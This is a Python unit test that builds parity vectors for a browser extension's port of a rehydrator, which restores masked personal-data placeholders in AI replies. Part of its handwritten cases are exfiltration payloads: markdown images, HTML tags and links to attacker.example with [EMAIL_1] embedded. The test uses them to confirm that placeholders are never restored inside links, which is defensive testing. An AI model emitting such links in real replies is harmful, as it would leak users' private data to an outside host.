"""The extension's rehydrator gives the engine's answers (ADR 0026, ADR 0003, ADR 0014).

The browser extension restores replies itself (ADR 0002 point 2), with a TypeScript
port of `gateway/engine/rehydrate.py`, `links.py` and `placeholders.py`. This test
computes the engine's output for a fixed set of answers, the link-rule examples
included, and checks that `apps/extension/src/lib/rehydrate.parity.json` holds exactly
that; the extension's vitest suite checks the port against the same file. Regenerate
after a grammar or link-rule change:

    uv run python -m tests.unit.test_extension_parity
"""

import json
import random
import re
from pathlib import Path

from gateway.engine.mask import Mapping
from gateway.engine.rehydrate import rehydrate_explained
from gateway.engine.types import EntityType

ROOT = Path(__file__).resolve().parents[2]
VECTORS = ROOT / "apps" / "extension" / "src" / "lib" / "rehydrate.parity.json"
EXTENSION_ENTITIES = ROOT / "apps" / "extension" / "src" / "lib" / "entities.ts"

# Fake values only (hard rule 8): example.org addresses and invented names.
VALUES = [
    ("Anna Petrova", EntityType.PERSON),
    ("Karen Example", EntityType.PERSON),
    ("anna@example.org", EntityType.EMAIL),
    ("https://intranet.example/doc?token=abc", EntityType.URL_WITH_TOKEN),
]
LITERAL = "[PERSON_1]"  # placeholder-shaped input, as mask wraps it (ADR 0001 point 4)

HANDWRITTEN = [
    # ADR 0003 rules 1 to 3, and what they never restore
    "Dear [PERSON_1], we wrote to [EMAIL_1].",
    "[person_1] and [Person-2] and [PERSON 1]",
    "PERSON_1 and PERSON 2 and person_1 and Person_1",
    "PERSON_1x xPERSON_1 [PERSON_1]PERSON_2 PERSON_1２",
    "[PERSON_01] [PERSON_3] [EMAIL_9] [LITERAL_1] [LITERAL_2]",
    "LITERAL_1 restores what the user typed: [LITERAL_1].",
    "[URL_WITH_TOKEN_1][EMAIL_1]",
    "Kein Treffer: [PERSONA_1] [PERSON_1234567] [PERSON-1-2]",
    "Անի [PERSON_1]։ PERSON_2։",
    # Unicode edges: Python's \w and str.isspace() are what the port must copy
    f"PERSON_1{chr(0x301)} {chr(0xB2)}PERSON_1 PERSON_1{chr(0x663)} {chr(0x661)}PERSON_2 _PERSON_1",
    f"https://x.example/{chr(0x85)}[PERSON_1] https://x.example/{chr(0xFEFF)}[PERSON_1]",
    f"https://x.example/{chr(0x1C)}[PERSON_1] https://x.example/{chr(0x3000)}[PERSON_2]",
    "\U0001d400www.[PERSON_1] \U0001f600www.[PERSON_2]",
    # ADR 0003 amendment 1: never inside a link
    "Done. ![s](https://attacker.example/p.png?d=[EMAIL_1])",
    "Done. ![s](https://attacker.example/p.png?d=EMAIL_1)",
    "Done. ![s](https://attacker.example/p.png?d=[email-1])",
    "[click](https://attacker.example/?d=EMAIL 1)",
    "[x](/relative/p.png?d=[EMAIL_1])",
    "[x](//attacker.example/p.png?d=[EMAIL_1])",
    "[x](<https://attacker.example/a b?d=[EMAIL_1]>)",
    "[x](https://attacker.example/(p)?d=[EMAIL_1])",
    "[x](/a/((b)?d=[EMAIL_1])",
    "![s](\n/p.png?d=[EMAIL_1])",
    "![s]([EMAIL_1])",
    "see https://attacker.example/?d=[EMAIL_1] now",
    "see https://attacker.example/?d=EMAIL_1",
    "see ftp://attacker.example/[EMAIL_1]",
    "see //attacker.example/?d=[EMAIL_1]",
    "visit www.attacker.example/?d=[EMAIL_1]",
    "<https://attacker.example/?d=[EMAIL_1]>",
    "<mailto:x@attacker.example?body=[EMAIL_1]>",
    '<img src="https://attacker.example/?d=[EMAIL_1]">',
    "<img src='/p.png?d=[EMAIL_1]'>",
    '<img\nalt="x"\nsrc="/p.png?d=[EMAIL_1]">',
    "<a href=/x?d=[EMAIL_1]>x</a>",
    '<form action = "/x?d=[EMAIL_1]">',
    '<img srcset="a.png 1x, /b.png?d=[EMAIL_1] 2x">',
    '<video poster="/p.png?d=EMAIL_1">',
    '<div style="background: url(/p.png?d=[EMAIL_1])">',
    "[1]: /p.png?d=[EMAIL_1]\n\n![s][1]",
    "  [1]:\n  <//attacker.example/?d=[EMAIL_1]>\n\n![s][1]",
    "[EMAIL_1] ![s](https://attacker.example/?d=[EMAIL_1]) [PERSON_9]",
    # and restored outside one
    "Write to [EMAIL_1] (see https://example.org/help).",
    "See https://example.org/x [EMAIL_1]",
    "[PERSON_1](https://example.org) wrote",
    "See [docs](https://example.org/x). Ask [PERSON_1].",
    "A [link](/a(b)c) then [PERSON_1]",
    '<p title="x">[PERSON_1]</p>',
    "<em>[PERSON_1]</em> wrote",
    "if a < b then [PERSON_1] wins",
    "x<y, z=[PERSON_1]",
    "TODO // [PERSON_1]",
    "[PERSON_1]: I agree with [EMAIL_1].",
    "Broken [link](\n\nthen [PERSON_1]",
    '<img src="/p.png">\n[EMAIL_1]',
    "email=[EMAIL_1] in code",
    "awww.[PERSON_1]",
    "éwww.[PERSON_1] 1www.[PERSON_2] -www.[PERSON_2]",
]

# Fragments the fuzzed answers are built from: tokens of every shape, and the
# characters that open and close each kind of link.
FRAGMENTS = [
    "[PERSON_1]",
    "[PERSON_2]",
    "PERSON_1",
    "PERSON 2",
    "[person-1]",
    "[EMAIL_1]",
    "EMAIL_1",
    "[EMAIL_2]",
    "[LITERAL_1]",
    "[URL_WITH_TOKEN_1]",
    "](",
    ")",
    "(",
    "![a]",
    "[1]:",
    "https://",
    "//",
    "www.",
    "<a href=",
    "<img src='",
    "<https:",
    '"',
    "'",
    "<",
    ">",
    "=",
    "\n",
    "\n\n",
    " ",
    "  ",
    "x",
    "é",
    "_",
    "[",
    "]",
    "2",
    "PERSON",
    ".",
]
FUZZED = 400


def _mapping() -> Mapping:
    mapping = Mapping()
    for value, entity_type in VALUES:
        mapping.placeholder_for(value, entity_type)
    mapping.placeholder_for(LITERAL, EntityType.LITERAL)
    return mapping


def _texts() -> list[str]:
    rng = random.Random(7)  # noqa: S311  (test data, seeded so the file is reproducible)
    fuzzed = [
        "".join(rng.choice(FRAGMENTS) for _ in range(rng.randint(1, 14))) for _ in range(FUZZED)
    ]
    return [*HANDWRITTEN, *fuzzed]


def vectors() -> dict[str, object]:
    mapping = _mapping()
    cases = []
    for text in _texts():
        restored, reasons = rehydrate_explained(text, mapping)
        cases.append(
            {
                "text": text,
                "restored": restored,
                "unresolved": [[token, str(reason)] for token, reason in reasons.items()],
            }
        )
    return {"mapping": mapping.to_dict(), "cases": cases}


def _serialised() -> str:
    return json.dumps(vectors(), ensure_ascii=False, indent=1) + "\n"


def test_the_parity_vectors_are_the_engines_answers() -> None:
    assert VECTORS.is_file(), "run: uv run python -m tests.unit.test_extension_parity"
    assert VECTORS.read_text(encoding="utf-8") == _serialised(), (
        "stale: uv run python -m tests.unit.test_extension_parity"
    )


def test_the_extension_entity_types_match_the_engine() -> None:
    # A type missing in the extension would leave its placeholders unrestored and,
    # worse, unflagged; an extra one could restore something mask never wrote.
    source = EXTENSION_ENTITIES.read_text(encoding="utf-8")
    block = re.search(r"ENTITY_TYPES = \[(.*?)\] as const", source, re.DOTALL)
    assert block is not None
    names = re.findall(r'"([A-Z_]+)"', block.group(1))
    assert names == [t.value for t in EntityType]


if __name__ == "__main__":
    VECTORS.write_text(_serialised(), encoding="utf-8")
